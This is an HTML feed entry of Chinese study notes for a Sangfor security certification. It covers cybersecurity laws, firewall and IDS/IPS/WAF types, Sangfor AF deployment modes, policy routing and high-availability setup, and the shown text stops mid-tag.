        <content type="html"><![CDATA[<h1 id="深信服安全技术认证工程师学习笔记"><a href="#深信服安全技术认证工程师学习笔记" class="headerlink" title="深信服安全技术认证工程师学习笔记"></a>深信服安全技术认证工程师学习笔记</h1><h2 id="第一章-网络安全基础"><a href="#第一章-网络安全基础" class="headerlink" title="第一章 网络安全基础"></a>第一章 网络安全基础</h2><h4 id="1-1信息时代与信息安全"><a href="#1-1信息时代与信息安全" class="headerlink" title="1.1信息时代与信息安全"></a>1.1信息时代与信息安全</h4><ul><li><p>我国超级计算机-神威太湖之光、天河二号</p></li><li><p>《中华人民共和国网络安全法》2016年11月7日颁布，于2017年6月1日正式实行</p></li><li><p>《中华人民共和国密码法》2019年10月26日正式通过，2020年1月1日正式实施</p></li><li><p>2020年04月27日，国家网信办等十二部门联合印发《网络安全审查办法》</p></li><li><p>2021年6月10日《中华人民共和国数据安全法》发布，于2021年9月1日起施行。</p></li><li><p>2021年7月30日，国务院发布《关键信息基础设施安全保护条例》，于2021年9月1日开始施行。</p></li><li><p>2021年8月20日，《中华人民共和国个人信息保护法》，于2021年11月1日开始实施。</p></li></ul><h4 id="1-2网络空间安全学科浅谈"><a href="#1-2网络空间安全学科浅谈" class="headerlink" title="1.2网络空间安全学科浅谈"></a>1.2网络空间安全学科浅谈</h4><h2 id="第二章-操作系统基础"><a href="#第二章-操作系统基础" class="headerlink" title="第二章 操作系统基础"></a>第二章 操作系统基础</h2><h2 id="第三章-网络运维"><a href="#第三章-网络运维" class="headerlink" title="第三章 网络运维"></a>第三章 网络运维</h2><h3 id="第一部分-计算机网络原理"><a href="#第一部分-计算机网络原理" class="headerlink" title="第一部分 计算机网络原理"></a>第一部分 计算机网络原理</h3><h3 id="第二部分-路由与交换"><a href="#第二部分-路由与交换" class="headerlink" title="第二部分 路由与交换"></a>第二部分 路由与交换</h3><h2 id="第四章-网络安全产品运维"><a href="#第四章-网络安全产品运维" class="headerlink" title="第四章 网络安全产品运维"></a>第四章 网络安全产品运维</h2><h3 id="第一部分-下一代防火墙基础原理与运维"><a href="#第一部分-下一代防火墙基础原理与运维" class="headerlink" title="第一部分 下一代防火墙基础原理与运维"></a>第一部分 下一代防火墙基础原理与运维</h3><h4 id="4-1-1下一代防火墙概述"><a href="#4-1-1下一代防火墙概述" class="headerlink" title="4.1.1下一代防火墙概述"></a>4.1.1下一代防火墙概述</h4><ol><li>防火墙分类</li></ol><p><img src="https://pic.imgdb.cn/item/66bc90add9c307b7e9c2c1ea.png"></p><ol start="2"><li><p>防火墙功能</p><ul><li>访问控制（ACL）</li><li>地址转换（NAT）</li><li>网络环境支持</li><li>带宽管理功能</li><li>入侵检测和攻击防御</li><li>用户认证</li><li>高可用性</li></ul></li><li><p>防火墙安全策略</p></li></ol><p><img src="https://pic.imgdb.cn/item/66bc918ed9c307b7e9c37e92.png"></p><ol start="4"><li>防火墙安全策略原理</li></ol><p><img src="https://pic.imgdb.cn/item/66bc9200d9c307b7e9c3d55d.png"></p><ol start="5"><li>安全策略分类</li></ol><ul><li>域间安全策略（不同域之间）</li><li>域内安全策略（相同域内）</li><li>接口包过滤</li></ul><ol start="6"><li>防火墙发展进程</li></ol><p><img src="https://pic.imgdb.cn/item/66bc93dbd9c307b7e9c53d54.png"></p><h5 id="传统防火墙（包过滤防火墙）"><a href="#传统防火墙（包过滤防火墙）" class="headerlink" title="传统防火墙（包过滤防火墙）"></a><u>传统防火墙（包过滤防火墙）</u></h5><ul><li>判断信息：五元组（源目IP、源目端口、协议类型）</li><li>工作范围：<strong>网络层、传输层</strong></li><li>和路由器的区别：多一个对包过滤的判断</li><li>技术应用：包过滤技术</li><li>优势：对于小型站点易实现，处理速度快，价格便宜</li><li>劣势：规则表会很庞大，只能基于五元组</li></ul><h5 id="传统防火墙（应用代理防火墙）"><a href="#传统防火墙（应用代理防火墙）" class="headerlink" title="传统防火墙（应用代理防火墙）"></a><u>传统防火墙（应用代理防火墙）</u></h5><ul><li>判断信息：所有应用层的信息包</li><li>工作范围：<strong>应用层</strong></li><li>与包过滤防火墙的区别：所在层不同，包过滤通过检验报头进行规则表匹配，应用代理检查所有应用层信息包，每个应用需要添加对应的代理服务</li><li>技术应用：应用代理技术</li><li>优势：检查了应用层数据</li><li>劣势：检测效率低，配置运维难度极高，可伸缩性差</li></ul><p><img src="https://pic.imgdb.cn/item/66bc97e9d9c307b7e9c886d8.png"></p><h5 id="传统防火墙（状态检测防火墙）"><a href="#传统防火墙（状态检测防火墙）" class="headerlink" title="传统防火墙（状态检测防火墙）"></a><u>传统防火墙（状态检测防火墙）</u></h5><ul><li><p>判断信息：IP、端口号、TCP标记</p></li><li><p>工作范围：<strong>数据链路层、网络层、传输层</strong></p></li><li><p>与包过滤的区别：是包过滤的升级，一次检查建立==<strong>会话表</strong>==，后期直接按会话表放行</p></li><li><p>技术应用：状态检测技术</p></li><li><p>优势：主要检查3-4层能保证效率，对TCP防御较好</p></li><li><p>劣势：应用层检查较弱，不检查数据区</p></li></ul><h5 id="入侵检测系统（IDS）"><a href="#入侵检测系统（IDS）" class="headerlink" title="入侵检测系统（IDS）"></a><u>入侵检测系统（IDS）</u></h5><ul><li>部署方式：旁路部署、可多点部署</li><li>工作范围：2-7层</li><li>工作特点：根据部署位置监控到的流量进行攻击事件的监控，属于事后呈现的系统。相当于网络监控摄像头</li><li>目的：主要为了帮助管理员清晰了解网络环境发生的事，只能发现攻击，不能做是或否的策略</li></ul><h5 id="入侵防御系统（IPS）"><a href="#入侵防御系统（IPS）" class="headerlink" title="入侵防御系统（IPS）"></a><u>入侵防御系统（IPS）</u></h5><ul><li>部署方式：串联部署</li><li>工作范围：2-7层</li><li>工作特点：根据已知安全威胁生成对应的过滤规则，对于已知威胁进行阻断，未知的放行</li><li>目的：<strong>IDS只检测不防御，IPS针对已知威胁进行防御</strong></li></ul><h5 id="防病毒网关（AV）"><a href="#防病毒网关（AV）" class="headerlink" title="防病毒网关（AV）"></a><u>防病毒网关（AV）</u></h5><ul><li><p>判断信息：数据包</p></li><li><p>工作范围：2-7层</p></li><li><p>目的：防止病毒文件流入内网环境</p></li><li><p>和防火墙的区别</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bc9cd6d9c307b7e9cec99c.png"></p><h6 id="传统的病毒检测方法："><a href="#传统的病毒检测方法：" class="headerlink" title="传统的病毒检测方法："></a>传统的病毒检测方法：</h6><p>MD5：病毒都会有一些共性的二进制序列</p><p>病毒特征码：特征码部分匹配二进制序列</p><p>规则匹配：正则表达式，当出现一些正则表达式，则判断为病毒</p><p>沙箱：虚拟执行、开销大、潜伏期长</p><h5 id="Web应用防火墙（WAF）"><a href="#Web应用防火墙（WAF）" class="headerlink" title="Web应用防火墙（WAF）"></a><u>Web应用防火墙（WAF）</u></h5><ul><li><p>判断信息：http协议数据的request和response</p></li><li><p>工作范围：应用层</p></li><li><p>目的：防止基于应用层的攻击影响Web应用系统</p></li><li><p>主要技术原理：</p><ul><li>代理服务：会话双向代理，用户与服务器不产生直接链接，对于DDOS攻击可以抑制</li><li>特征识别：通过正则表达式的特征库进行特征识别</li><li>算法识别：针对攻击方式进行模式化识别，如SQL注入、DDOS、XSS等</li></ul></li></ul><h5 id="统一威胁管理（UTM）-多合一安全网关"><a href="#统一威胁管理（UTM）-多合一安全网关" class="headerlink" title="统一威胁管理（UTM）-多合一安全网关"></a><u>统一威胁管理（UTM）-多合一安全网关</u></h5><ul><li>包含功能：FW、IDS、IPS、AV</li><li>工作范围：2-7层</li><li>目的：将多种安全问题通过一台设备解决</li><li>优点：功能多合一，降低硬件、人力、时间成本</li><li>缺点：模块串联检测效率低，性能消耗大</li></ul><p><img src="https://pic.imgdb.cn/item/66bc9fcdd9c307b7e9d6d607.png"></p><h5 id="下一代防火墙（NGFW）-升级版UTM"><a href="#下一代防火墙（NGFW）-升级版UTM" class="headerlink" title="下一代防火墙（NGFW）-升级版UTM"></a><u>下一代防火墙（NGFW）-升级版UTM</u></h5><ul><li>包含功能：FW、IDS、IPS、AV、WAF</li><li>工作范围：2-7层</li><li>和UTM的区别：<ul><li>增加了WAF</li><li>UTM是<strong>串行处理</strong>机制，NGFW是<strong>并行处理</strong>机制</li><li>NGFW性能更强，管理更高效</li></ul></li></ul><h4 id="4-1-2-深信服下一代防火墙解决方案"><a href="#4-1-2-深信服下一代防火墙解决方案" class="headerlink" title="4.1.2 深信服下一代防火墙解决方案"></a>4.1.2 深信服下一代防火墙解决方案</h4><ol><li>传统防火墙的防御模式：</li></ol><ul><li>通过防御设备划分边界，基于IP/端口和特征进行判断</li><li>以隔离为基础，基于信任原则构建安全框架</li><li>以防护为核心，基于静态特征的攻击检测</li></ul><ol start="2"><li>安全现状</li></ol><p><img src="https://pic.imgdb.cn/item/66bca209d9c307b7e9d8f92c.png"></p><p><img src="https://pic.imgdb.cn/item/66bca239d9c307b7e9d92602.png"></p><h5 id="深信服应对方案"><a href="#深信服应对方案" class="headerlink" title="深信服应对方案"></a>深信服应对方案</h5><ul><li>==<u><strong>深信服AF的核心价值</strong></u>==</li></ul><p><img src="https://pic.imgdb.cn/item/66bca2cfd9c307b7e9d9acd0.png"></p><p>（1）风险全面可视化</p><p><img src="https://pic.imgdb.cn/item/66bca308d9c307b7e9d9e170.png"></p><p>（2）保障企业业务安全</p><p><img src="https://pic.imgdb.cn/item/66bca430d9c307b7e9daed50.png"></p><ul><li>事前风险预知</li></ul><p><img src="https://pic.imgdb.cn/item/66bca4ead9c307b7e9db9eb2.png"></p><ul><li>事中风险防御</li></ul><p><img src="https://pic.imgdb.cn/item/66bca5ccd9c307b7e9dc5f5d.png"></p><ul><li>事后持续检测与响应</li></ul><p><img src="https://pic.imgdb.cn/item/66bca710d9c307b7e9dd97a6.png"></p><ul><li>业务全面保护</li></ul><p><img src="https://pic.imgdb.cn/item/66bca7e3d9c307b7e9de66c7.png"></p><h5 id="深信服人工智能杀毒引擎SAVE"><a href="#深信服人工智能杀毒引擎SAVE" class="headerlink" title="==深信服人工智能杀毒引擎SAVE=="></a>==<strong><u>深信服人工智能杀毒引擎SAVE</u></strong>==</h5><p><img src="https://pic.imgdb.cn/item/66bca8a2d9c307b7e9df1f86.png"></p><p><img src="https://pic.imgdb.cn/item/66bca943d9c307b7e9dfd09f.png"></p><h5 id="智能联动"><a href="#智能联动" class="headerlink" title="智能联动"></a>智能联动</h5><p>图谱：</p><p><img src="https://pic.imgdb.cn/item/66bca9e2d9c307b7e9e074d7.png"></p><h5 id="云端智能检测-威胁情报"><a href="#云端智能检测-威胁情报" class="headerlink" title="云端智能检测-威胁情报"></a>云端智能检测-威胁情报</h5><p><img src="https://pic.imgdb.cn/item/66bcaa35d9c307b7e9e0d7a8.png"></p><h5 id="云端智能检测-云端沙箱"><a href="#云端智能检测-云端沙箱" class="headerlink" title="云端智能检测-云端沙箱"></a>云端智能检测-云端沙箱</h5><p><img src="https://pic.imgdb.cn/item/66bcaa77d9c307b7e9e1a42f.png"></p><h5 id="互联网出口安全防护场景"><a href="#互联网出口安全防护场景" class="headerlink" title="互联网出口安全防护场景"></a>互联网出口安全防护场景</h5><p><img src="https://pic.imgdb.cn/item/66bcaadad9c307b7e9e31c01.png"></p><h5 id="对外业务发布安全防护场景"><a href="#对外业务发布安全防护场景" class="headerlink" title="对外业务发布安全防护场景"></a>对外业务发布安全防护场景</h5><p><img src="https://pic.imgdb.cn/item/66bcc0b4d9c307b7e9074ed9.png"></p><h5 id="分支机构安全防护场景"><a href="#分支机构安全防护场景" class="headerlink" title="分支机构安全防护场景"></a>分支机构安全防护场景</h5><p><img src="https://pic.imgdb.cn/item/66bcc107d9c307b7e907a222.png"></p><h5 id="数据中心安全防护"><a href="#数据中心安全防护" class="headerlink" title="数据中心安全防护"></a>数据中心安全防护</h5><p><img src="https://pic.imgdb.cn/item/66bcc165d9c307b7e9080495.png"></p><h4 id="4-1-3-下一代防火墙组网简介"><a href="#4-1-3-下一代防火墙组网简介" class="headerlink" title="4.1.3 下一代防火墙组网简介"></a>4.1.3 下一代防火墙组网简介</h4><p>下一代防火墙具备灵活网络适应能力，支持：**==路由模式、透明模式、虚拟网线模式、混合模式、旁路模式==**</p><p><img src="https://pic.imgdb.cn/item/66bcc337d9c307b7e909efa6.png"></p><h5 id="AF的接口"><a href="#AF的接口" class="headerlink" title="AF的接口"></a>AF的接口</h5><ul><li>根据接口属性分为：物理接口（**==路由口、透明口、虚拟网线口、旁路镜像口==**）、子接口、VLAN接口、聚合接口</li><li>根据接口不同工作层面，分为：二层区域、三层区域、虚拟网线区域</li></ul><p>​<u>AF的部署模式由各接口的属性决定的</u></p><ol><li>物理接口</li></ol><ul><li><p>分为四种类型：<strong>路由、透明、虚拟网线、旁路镜像</strong></p></li><li><p>无法删除或新增，数量由硬件决定</p><ol><li><p>路由接口：需配置ip，具有路由转发功能</p><ul><li>部分功能要求出接口属性是WAN属性，比如流控、流审等</li><li>需要手动配置缺省路由0.0.0.0<ul><li>ADSL拨号（PPPoE）</li><li>管理口：Eth0为固定管理口，类型为路由口，无法修改，<strong>默认管理IP为10.251.251.251/24</strong></li></ul></li></ul></li><li><p>虚拟网线接口：普通交换接口，不能配IP，不支持路由转发，转发数据时，不验证MAC表，直接从虚拟网线配对的接口转发</p><ul><li>转发性能高于透明接口（要查MAC），单进单出，双进双出等成对出现的网桥环境下，推荐使用虚拟网线接口部署</li></ul></li><li><p>旁路镜像接口：不能配IP，不支持数据转发，只是用来接收从外部镜像过来的镜像数据</p><ul><li>可配置多个</li></ul></li></ol></li></ul><ol start="2"><li>聚合接口：将多个以太网接口捆绑在一起形成逻辑接口</li></ol><ul><li>最多支持4个聚合接口</li><li>不支持旁路镜像</li></ul><ol start="3"><li>子接口：应用于路由接口需要启动VLAN或TRUNK的时候</li></ol><ul><li>逻辑接口，只能在路由口下添加，默认继承物理口的属性</li></ul><ol start="4"><li>VLAN接口：为VLAN定义IP，则会产生VLAN接口</li></ol><ul><li>逻辑接口</li></ul><h5 id="接口设置注意事项"><a href="#接口设置注意事项" class="headerlink" title="接口设置注意事项"></a>接口设置注意事项</h5><ul><li>设备支持配置多个WAN属性的路由接口连接多条外网线路，但是需要开通多条线路的授权。</li><li>管理口不支持设置成透明接口或虚拟网线接口，如果要设置2对或2对以上的虚拟网线接口，则必须要求设备不少于5个物理接口，预留一个专门的管理口Eth0。</li><li>一个路由接口下可添加多个子接口，路由接口的IP地址不能与子接口的IP地址在同网段。</li></ul><h5 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h5><p>什么是区域？</p><ul><li>是本地逻辑安全区域的概念</li><li>一个或多个接口所连接的网络</li><li>用于定义和归类接口</li></ul><p>==<strong><u>一个接口只能属于一个区域，而一个区域可以有多个接口</u></strong>==</p><h5 id="错题："><a href="#错题：" class="headerlink" title="错题："></a><u>错题</u>：</h5><p><img src="https://pic.imgdb.cn/item/66bd94fcd9c307b7e90d04ae.png"></p><h4 id="4-1-4-下一代防火墙组网-路由模式"><a href="#4-1-4-下一代防火墙组网-路由模式" class="headerlink" title="4.1.4 下一代防火墙组网-路由模式"></a>4.1.4 下一代防火墙组网-路由模式</h4><ol><li>需求背景</li></ol><ul><li><p>客户需求：使用AF替换防火墙部署在出口</p></li><li><p>需求分析</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bd961cd9c307b7e90dff77.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bd96d0d9c307b7e90ea223.png"></p><ul><li>单臂路由模式</li></ul><p><img src="https://pic.imgdb.cn/item/66bd97cbd9c307b7e90f7c3d.png"></p><p><img src="https://pic.imgdb.cn/item/66bd983ad9c307b7e90fdaad.png"></p><ul><li><p>配置步骤：</p></li><li><p>注意事项</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bd998bd9c307b7e911b40e.png"></p><h4 id="4-1-5-下一代防火墙组网-透明模式"><a href="#4-1-5-下一代防火墙组网-透明模式" class="headerlink" title="4.1.5 下一代防火墙组网-透明模式"></a>4.1.5 下一代防火墙组网-透明模式</h4><ol><li>需求背景</li></ol><ul><li><p>客户需求：增加一台AF设备做安全防护，不改动现有网络环境</p></li><li><p>需求分析：</p></li></ul><p><img src="https://pic.imgdb.cn/item/66bdbb98d9c307b7e9439614.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bdbb76d9c307b7e9437a72.png"></p><ul><li>透明模式与虚拟网线模式的区别</li></ul><p><img src="https://pic.imgdb.cn/item/66bdbc42d9c307b7e9441a79.png"></p><ul><li>配置案例</li></ul><p><img src="https://pic.imgdb.cn/item/66bdbd0cd9c307b7e944b94c.png"></p><ul><li><strong><u>注意事项</u></strong></li></ul><p><img src="https://pic.imgdb.cn/item/66bdbe3ed9c307b7e945aeab.png"></p><h4 id="4-1-6-下一代防火墙组网-旁路模式"><a href="#4-1-6-下一代防火墙组网-旁路模式" class="headerlink" title="4.1.6 下一代防火墙组网-旁路模式"></a>4.1.6 下一代防火墙组网-旁路模式</h4><ol><li>需求背景</li></ol><p><img src="https://pic.imgdb.cn/item/66bdc38fd9c307b7e94a22ce.png"></p><ul><li>需求分析</li></ul><p><img src="https://pic.imgdb.cn/item/66bdc637d9c307b7e950a3ab.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bdc668d9c307b7e9510e40.png"></p><ul><li>配置案例</li></ul><p><img src="https://pic.imgdb.cn/item/66bdcaabd9c307b7e956ca69.png"></p><ul><li>注意事项</li></ul><p><img src="https://pic.imgdb.cn/item/66bdcbc4d9c307b7e957840f.png"></p><h4 id="4-1-7-下一代防火墙组网-混合模式"><a href="#4-1-7-下一代防火墙组网-混合模式" class="headerlink" title="4.1.7 下一代防火墙组网-混合模式"></a>4.1.7 下一代防火墙组网-混合模式</h4><ol><li>需求背景</li></ol><ul><li>客户需求</li></ul><p><img src="https://pic.imgdb.cn/item/66bdceb4d9c307b7e959923b.png"></p><ul><li>需求分析</li></ul><p><img src="https://pic.imgdb.cn/item/66bdcfe1d9c307b7e95a686a.png"></p><ul><li>配置思路</li></ul><p><img src="https://pic.imgdb.cn/item/66bdd093d9c307b7e95add39.png"></p><ul><li>配置案例</li></ul><p><img src="https://pic.imgdb.cn/item/66bdd112d9c307b7e95b4273.png"></p><ul><li>注意事项</li></ul><p><img src="https://pic.imgdb.cn/item/66be0893d9c307b7e9a6b07e.png"></p><h4 id="4-1-8-策略路由解决方案"><a href="#4-1-8-策略路由解决方案" class="headerlink" title="4.1.8 策略路由解决方案"></a>4.1.8 策略路由解决方案</h4><ol><li>策略路由概述</li></ol><p>​在企业网络环境中，存在多条互联网出口线路，经常出现某一条线路接口带宽占满，另外一条线路经常空闲状态，从而导致网络时延过高，带宽利用率低，业务运行无法得到保障，严重影响办公人员工作效率和用户带来的投诉。因此，需要一种技术手段解决互联网<strong>多出口带宽利用率</strong>的问题。</p><ol start="2"><li>策略路由的定义</li></ol><p>​为保障出接口多条线路时，根据源/目的IP、源/目的端口、协议等条件进行出接口和线路选择，以<u>实现不同的数据走不同的外网线路的自动选路功能</u></p><p><img src="https://pic.imgdb.cn/item/66be1181d9c307b7e9b6988f.png"></p><ol start="3"><li>策略路由类型（两种）</li></ol><ul><li>源地址策略路由</li></ul><p>​存在多条线路出口情况下，根据源/目IP，端口、协议、应用来定义匹配条件，对于匹配上的流量根据选择<strong>指定线路</strong>的出口或下一跳，比如多运营商选路场景</p><p>​<strong><u>支持DNS检查、PING检测、ARP检测</u></strong></p><ul><li>多线路负载路由</li></ul><p>​存在多条线路出口情况下，根据源/目IP，端口、协议、应用来定义匹配条件，对出接口选择轮询、带宽比例、加权最小流量、优先使用前面的<strong>线路策略</strong>，进行<strong>动态选择线路</strong>实现线路带宽的有效利用和负载均衡</p><p>​<strong>==轮询==</strong>:平均分配连接到多条外网线路</p><p>​<strong>==带宽比例==</strong>:按照外网线路带宽的比例来分配连接</p><p>​<strong>==加权最小流量==</strong>:通过比较当前线路流量与线路带宽的比值，选择最小的线路优先分配连接</p><p>​<strong>==优先使用前面的线路==</strong>:用于线路需要做主备的场景，则所有连接均分配到第一条线路如果第一条线路故障，才把连接切换到第二条选择的可用线路</p><ol start="4"><li>应用场景</li></ol><p><img src="https://pic.imgdb.cn/item/66bed127d9c307b7e93ad5b9.png"></p><pre><code>5. 配置案例</code></pre><p><img src="https://pic.imgdb.cn/item/66bed226d9c307b7e93b9e4f.png"></p><ul><li>配置思路及步骤</li></ul><p><img src="https://pic.imgdb.cn/item/66bed28dd9c307b7e93be86d.png"></p><ul><li>注意事项</li></ul><p><img src="https://pic.imgdb.cn/item/66bedce7d9c307b7e9436b93.png"></p><h5 id="错题：-1"><a href="#错题：-1" class="headerlink" title="错题："></a><u>错题</u>：</h5><p><img src="https://pic.imgdb.cn/item/66bedf51d9c307b7e9456d78.png"></p><p><img src="https://pic.imgdb.cn/item/66bedf67d9c307b7e9457f05.png"></p><h4 id="4-1-9-高可用性功能基础（高可用性架构）"><a href="#4-1-9-高可用性功能基础（高可用性架构）" class="headerlink" title="4.1.9 高可用性功能基础（高可用性架构）"></a>4.1.9 高可用性功能基础（高可用性架构）</h4><ol><li><p>客户需求：提高网络可靠性，保证业务连续性，**<u>避免单点故障</u>**</p></li><li><p>功能概述：高可用性功能，用来解决AF单点故障，所以在**<u>出口部署两台AF</u>**，以达到冗余备份</p></li><li><p>建立基础：</p></li></ol><p><img src="https://pic.imgdb.cn/item/66bee04ed9c307b7e9463fb8.png"></p><p>名词解释：</p><ol><li><u>主线路与辅线路</u></li></ol><p>主线路：负责主备机<strong>心跳保持、配置同步、会话同步</strong>。目前支持使用<strong>聚合口</strong>做为心跳接口，但聚合接口模式只支持<strong>“主备模式”</strong></p><p>辅线路：当主心跳故障后，辅心跳可承接主心跳进行心跳保证的工作，同样支持聚合主备接口。<strong>但需要注意，辅心跳不支持配置同步，所以如果主心跳故障的，也需要立即处置，否则还是有业务风险</strong></p><pre><code>      2. &lt;u&gt;抢占（在双机热备配置）&lt;/u&gt;</code></pre><p>不开启抢占：如果原主机因故障切换成备机，故障恢复后，就算优先级高，也不会自动恢复成主机，而是以备机身份继续运行</p><p>开启抢占：如果原主机因故障切换成备机，故障恢复后，如果优先级高，会自动恢复成主机</p><p>抢占功能非特殊场景<strong>不建议开</strong>，原因是当主机网线出现故障，主机状态变成备机或者故障状态之后，网口默认不发包，设备链路检测状态为故障，当线路恢复正常，主机抢占回主状态，这个时候链路状态还未恢复，主机又会恢复成备机或者故障状态，会一直反复来回切换增加切换频次，而且因为AF必须同构(即两台AF需要硬件一致)运行，所以也不存在位差异，抢占的意义一般不大</p><ol start="3"><li><u>网口监视</u></li></ol><p>网口监视：双机切换条件之一，通过接口物理状态进行检测结果判定，如接口出现ifconfig down，网线脱落，协商失败等物理故障。物理状态的故障双机状态可以快速检测到，并在多播包中发送prio=0，通知对端变成主机，理论上可以实现无延时切换</p><p>网口监视还有一个功能是，<strong>备机状态下，添加到网口监视中的接口，处于发包抑制状态</strong>，无法发送任何数据包，所以<strong>配置了业务的接口，都必须添加到网口监视中</strong>，否则双机同步配置后，主备机接口IP一致，就会导致网络中的IP冲突</p><ol start="4"><li><u>链路监视</u></li></ol><p>双机切换条件之一，通过链路连通性状态进行检测结果判定，目前支持<strong>ARP、DNS、PING</strong>三种检测方法，三种检测方法可以在接口上选择性开启，同时双机判断链路失败的条件也可以自由组合</p><ol start="5"><li><u>主备机与主备控</u></li></ol><p>主备机:简单理解为设备<strong>数据层面</strong>控制，主机状态<u>加入网口监视</u>的业务接口<strong>允许</strong>进行正常的数据转发，备机状态<u>加</u><br><u>入网口监视</u>的业务接口<strong>不允许</strong>进行数据转发</p><p>主备控:简单理解为设备<strong>配置层面</strong>控制，主控<strong>允许</strong>修改设备配置，备控<strong>不允许</strong>修改设备配置，主机强制绑定为主控，备机强制绑定为备控。主备控配置同步的流程为：</p><ul><li>备控向主控主动发起配置更新请求（10秒一次发送需要同步配置文件的MD5到主控）</li><li>主控收到备控请求后，向备控同步当前的配置（比对有MD5差异的文件，把有差异的文件同步给备控）</li></ul><p><img src="https://pic.imgdb.cn/item/66bee9ffd9c307b7e94df86a.png"></p><ol start="4"><li>高可用部署类型</li></ol><p>（1）主备部署</p><ul><li>两台设备只有一台处于<strong>工作状态</strong>，还有一台处于<strong>热备状态</strong>，当检测机制检测到主机故障后，由热备设备自动承接所有工作，从而来保障客户业务的连续性</li></ul><p>（2）主主部署</p><ul><li>两台设备均处于工作状态，根据流量转发到不同AF的情况，来进行数据处理，主主又分两种情况:<ul><li>有VRRP双主：配置多组VRRP，每组有不同的主备机，该场景<strong>不推荐</strong>，路由有VRRP双主基本上很难支持起来。透明有VRRP双主一般就直接引导为无VRRP双主</li><li>无VRRP双主：<strong>不配置</strong>VRRP组，只配置双机基本信息和配置同步，根据上下联设备把数据引流到不同设备来进行承接</li></ul></li></ul><ol start="5"><li>高可用性基本原理</li></ol><ul><li>主备部署，是通过<strong>VRRP协议</strong>来实现主备关系之间的选择和切换，<u>优先级高的为主</u>，优先级相同的情况下<u>心跳口IP地址大</u>的为主。但AF又不完全是使用标准的VRRP协议，在标准VRRP协议上做了一定的开发</li><li>VRRP(Virtual Router Redundancy Protocol，<strong>虚拟路由器冗余协议</strong>)将可以承担网关功能的一组路由器加入到备份组中，形成一台虚拟路由器，这样主机的网关设置成虚拟网关就能够实现冗余</li></ul><p><img src="https://pic.imgdb.cn/item/66beec06d9c307b7e94fd60c.png"></p><ol start="6"><li>状态切换</li></ol><p><img src="https://pic.imgdb.cn/item/66beed45d9c307b7e950eab9.png"></p><ol start="7"><li>虚拟IP和虚拟MAC</li></ol><ul><li><p>虚拟IP</p><ul><li>为了保证双机<strong>切换时</strong>内网PC<u>不需要重新修改网关IP和重新学习网关mac</u>，要求主备机在同一个vrid组中对应的接口拥有同样的IP地址和mac地址</li><li>AF实现方法是，启用双机配置同步之后，两台设备接口ip是一样的(加了HA标签的口除外)，即同一个vrid组中的对应接口拥有相同的IP地址，设备工作为备机时通过ha_drv模块丢弃所有到本接口和从本接口出去的数据包，这样只有主机工作，因此不会产生冲突</li><li><u>注意，业务口都要加入到网口监视中，双机才能正常切换，另外，接口是路由式下，路由接口都要加入网口监视中才能避免ip冲突</u></li></ul></li><li><p>虚拟MAC</p><ul><li>同-vrid组中对应的两个接口分别有自己的实MAC，和一个虚拟MAC，<u>谁为主机谁就使用这个虚拟MAC</u>，切换成备机后接口的MAC地址又换回成实MAC，这样内网PC得到网关的IP/MAC不会随着设备切换而发生改变</li><li>虚拟MAC的构成:<strong>vrrp mac(00-00-5E)+接口序号+vrid</strong>，比如:vrid为101，eth1口的虚拟MAC就是:00-00-5E-00-01-65，eth2口的虚拟MAC就是:00-00-5E-00-02-65，65的十进制就是101</li></ul></li></ul><h4 id="4-1-10-主主-主备部署应用场景及配置思路"><a href="#4-1-10-主主-主备部署应用场景及配置思路" class="headerlink" title="4.1.10 主主&amp;主备部署应用场景及配置思路"></a>4.1.10 主主&amp;主备部署应用场景及配置思路</h4><h5 id="主备部署"><a href="#主备部署" class="headerlink" title="主备部署"></a>主备部署</h5><ol><li>应用场景</li></ol><p><img src="https://pic.imgdb.cn/item/66bef849d9c307b7e95a7b61.png"></p><ol start="2"><li>配置思路</li></ol><p><img src="https://pic.imgdb.cn/item/66bef8a0d9c307b7e95acb2a.png"></p><ol start="3"><li>配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/66bef975d9c307b7e95bb513.png"></p><ul><li>心跳口不能为业务口，需要单独配置一个物理接口（或聚合口）</li></ul><ol start="4"><li>==<strong><u>注意事项</u></strong>==</li></ol><p><img src="https://pic.imgdb.cn/item/66befe9fd9c307b7e9608a2e.png"></p><h5 id="主主部署"><a href="#主主部署" class="headerlink" title="主主部署"></a>主主部署</h5><ol><li>应用场景：</li></ol><p><img src="https://pic.imgdb.cn/item/66beff90d9c307b7e96154b5.png"></p><ol start="2"><li>配置思路</li></ol><p><img src="https://pic.imgdb.cn/item/66bf026bd9c307b7e963988b.png"></p><ol start="3"><li>配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/66c08cbed9c307b7e93d5d41.png"></p><ol start="4"><li><strong><u>==注意事项==</u></strong></li></ol><p><img src="https://pic.imgdb.cn/item/66c08e9fd9c307b7e93ef010.png"></p><h4 id="4-1-11-双机聚合应用场景及配置思路-双机部署常见故障"><a href="#4-1-11-双机聚合应用场景及配置思路-双机部署常见故障" class="headerlink" title="4.1.11 双机聚合应用场景及配置思路&amp;双机部署常见故障"></a>4.1.11 双机聚合应用场景及配置思路&amp;双机部署常见故障</h4><ol><li>需求背景</li></ol><p><img src="https://pic.imgdb.cn/item/66c090a9d9c307b7e94100b4.png"></p><ol start="2"><li>基本原理</li></ol><p>​双机聚合功能开启后，每台AF都会在后台程序自动生成一个是0或者是1的编号，这个编号界面上看不到，所有经过AF的流量都会是经过算法(即根据源/目的IP地址)计算，看计算结果的值是0还是1，从而将对应数据包转发到对应编号的AF上进行转发(比如根据算法算出来的值是0，则从编号为0的AF转发数据)</p><p><img src="https://pic.imgdb.cn/item/66c092b3d9c307b7e945cc9d.png"></p><ol start="3"><li>具体过程</li></ol><p><img src="https://pic.imgdb.cn/item/66c0933bd9c307b7e94651a9.png"></p><ol start="4"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66d9c2b8d9c307b7e9021050.png"></p><ol start="5"><li>常见故障排查</li></ol><p><img src="https://pic.imgdb.cn/item/66dc0647d9c307b7e9bf2b0d.png"></p><h5 id="错题：-2"><a href="#错题：-2" class="headerlink" title="错题："></a><u>错题：</u></h5><p><img src="https://pic.imgdb.cn/item/66dc154ad9c307b7e9d7a1cd.png"></p><p><img 